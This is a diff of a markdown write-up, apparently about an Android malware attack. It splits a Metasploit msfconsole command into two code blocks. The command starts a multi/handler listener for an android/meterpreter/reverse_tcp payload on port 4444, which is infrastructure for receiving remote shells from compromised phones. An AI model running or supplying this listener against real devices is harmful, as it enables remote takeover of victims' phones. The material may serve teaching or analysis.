@@ -179,7 +179,9 @@ Upon approval, the malicious payload becomes active
 
 **The attack infrastructure utilizes Metasploit's multi/handler module to receive incoming connections:**
 
-```msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444"```
+```msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;```
+
+```set LHOST 0.0.0.0; set LPORT 4444"```
 
 #### Connection Establishment
 
